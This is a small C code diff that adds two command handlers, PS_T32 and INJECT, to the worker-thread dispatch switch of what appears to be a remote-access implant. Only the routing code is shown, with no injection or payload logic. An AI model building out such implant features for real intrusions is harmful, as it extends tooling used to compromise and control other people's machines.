@@ -74,6 +74,22 @@ DWORD WINAPI wrkr_thread(struct new_thread_params_t* params) {
         implant_runcode(&trans, runcode_req);
         break;
     }
+    case PS_T32: {
+        struct pst32_msg_t* pst32_msg =
+            &msg.pst32;
+        struct pst32_req_t* pst32_req =
+            &pst32_msg->req;
+        implant_pst32(&trans, pst32_req);
+        break;
+    }
+    case INJECT: {
+        struct inject_msg_t* inject_msg =
+            &msg.inject;
+        struct inject_req_t* inject_req =
+            &inject_msg->req;
+        implant_inject(&trans, inject_req);
+        break;
+    }
     default:
         break;
     }
